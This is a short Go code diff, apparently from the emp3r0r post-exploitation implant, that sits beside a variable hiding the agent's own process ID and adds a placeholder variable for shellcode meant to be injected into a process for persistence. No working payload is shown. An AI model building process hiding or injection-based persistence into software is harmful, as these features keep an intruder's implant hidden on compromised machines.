@@ -36,6 +36,9 @@ var (
 
 	// HIDE_PIDS all the processeserr from emp3r0r
 	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}
+
+	// GuardianShellcode inject into a process to gain persistence
+	GuardianShellcode = `[persistence_shellcode]`
 )
 
 const (
